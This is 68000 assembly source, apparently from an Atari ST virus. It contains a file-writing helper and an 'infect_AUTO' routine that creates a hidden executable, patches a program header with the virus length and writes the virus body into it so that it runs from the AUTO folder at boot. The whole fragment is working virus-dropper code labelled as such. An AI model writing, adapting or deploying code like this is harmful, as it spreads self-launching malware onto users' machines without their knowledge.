; ======================================================
;	WRITE FILE
;
; INPUT: A0.l = buffer
;	 D0.l = len
;	 D1.w = file handle
;
; RETURNS: 
; D0 = (success) number of bytes written
; D0 = (fail) negative error code 
;
; ========================================================
		
write_prg:
	movem.l	d1-d7/a0-a6,-(a7)
	pea	 (a0)
	move.l   d0,-(sp)
	move.w   d1,-(sp)
	move.w   #$40,-(sp)
	trap	 #1
	lea	 12(sp),sp
	movem.l	(a7)+,d1-d7/a0-a6
	rts
END_write_prg:



; =========================================================
;
;   DROP PRG IN AUTO FOLDER
;
; INPUT: A0 = &(buffer) to write
;	 A1 = &(filename)
;	 D0 = bufflen
; OUTPUT: D0 = success or failure
;
; ========================================================

infect_AUTO:
fhwnd	EQU -4	; .w
blen	EQU -8  ; .l absolute virus length needed
buff	EQU -12 ; .l

		link a6,#-12
		movem.l	d1-d7/a0-a5,-(a7)		
		move.l	d0,blen(a6)
		move.l	a0,buff(a6)
		
	create_prg:
		; fcreate()
		move.w	#$10,-(sp)	; hidden file
		pea	(a1)
		move.w	#$3C,-(sp)	; fcreate()
		trap	#1
		addq.l	#8,sp
		tst.w   d0
		bmi.s   exit_infect_AUTO
		lea.l	fhwnd(a6),a0
		move.w	d0,(a0)
				
	set_hdr:
	    ; set .TEXT size entry
		lea.l	PRG_START(pc),a0
		move.l	blen(a6),2(a0)		
	drop_hdr:
		move.l	 #(PHDRLEN),d0
		move.w	 fhwnd(a6),d1
		bsr	 write_prg
		
	drop_virus:
		move.l	 buff(a6),a0
		move.l	 blen(a6),d0
		move.w	 fhwnd(a6),d1
		bsr	 write_prg
		
	close_prg:
		move.w   fhwnd(a6),-(sp)
		move.w   #$3E,-(sp)
		trap	 #1
		addq.l   #4,sp
exit_infect_AUTO:
		movem.l	(a7)+,d1-d7/a0-a5
		unlk	a6
		rts
END_INFECT_AUTO:

; PRG header
PRG_START:
	dc.b $60,$1A,$00,$00,$01,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
	dc.b $00,$00,$00,$00,$00,$00,$00,$00
PRG_END:
PHDRLEN	  EQU	(PRG_END-PRG_START)